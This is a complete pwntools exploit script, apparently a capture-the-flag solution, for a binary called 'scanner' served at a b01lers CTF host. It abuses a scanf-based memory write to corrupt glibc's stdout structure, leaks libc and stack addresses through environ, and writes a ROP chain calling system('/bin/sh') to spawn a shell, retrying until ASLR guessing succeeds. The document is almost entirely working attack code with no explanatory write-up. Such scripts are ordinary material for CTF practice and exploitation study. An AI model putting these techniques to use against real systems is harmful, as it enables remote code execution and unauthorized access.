#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './scanner_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'scanfun.harkonnen.b01lersc.tf', 8443

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    set sysroot /proc/{pid}/root
    # b *__isoc99_scanf+201
    # b *scan+162
    # b *__isoc99_scanf+173
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='scanner')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
#     Arch:       amd64-64-little
#     RELRO:      Full RELRO
#     Stack:      No canary found
#     NX:         NX enabled
#     PIE:        PIE enabled
#     Stripped:   No

def send_scan(offset, payload):
    io.sendlineafter(b'What do you want to scan?\n', f"%{offset}${len(payload)}c")
    sleep(1)    
    io.sendline(payload)

def exploit():
    global io
    io = initialize()
    with log.progress("Changing pointer to stdout"), context.silent:
        io.recvuntil(b"no more [")
        stdout_3th_byte = int(io.recvuntil(b"]", drop=True),16)
        send_scan(16, b"A"*8 + b"\x80" + b"\xb7" + p8(stdout_3th_byte)) #2nd byte need to be brute forced ASLR
    log.info("stdout_3th_byte: %#x",stdout_3th_byte)

    with log.progress("Leak libc via stdout"), context.silent:
        send_scan(19, p64(0xfbad1800) + p64(0) * 3 + b'\x00' + b"\xb7") # changing the stdout + 0x20 with 2 byte to leak
        io.recv(8)
        libc_leak = u64(io.recv(8))
        if libc_leak == 0x746e617720756f79:
            return False
        libc.address = libc_leak - libc.sym['_IO_2_1_stdout_']
    log.info("Libc Leak: %#x", libc_leak)
    log.info("Libc Base: %#x", libc.address)

    with log.progress("Leak stack via stdout with environ"), context.silent:
        send_scan(19, p64(0xfbad1800) + p64(0) * 3 + p64(libc.sym["environ"]) + p64(libc.sym["environ"] + 8))
        stack_leak = u64(io.recv(8))
        ret = stack_leak - 0x190
    log.info("Stack Leak: %#x", stack_leak)
    log.info("Ret: %#x", ret)

    with log.progress("Get shell"), context.silent:
        send_scan(16, b"A"*8 + p64(ret))
        rop = ROP(libc)
        rop.raw(rop.ret.address)
        rop.system(next(libc.search(b'/bin/sh\x00')))
        send_scan(19, rop.chain())
    return True

if __name__ == '__main__':
    while True:
        try:
            if exploit():
                break
            else:
                log.info("Exploit failed, retrying...")
                io.close()
        except EOFError:
            io.close()
            pass
    io.interactive()


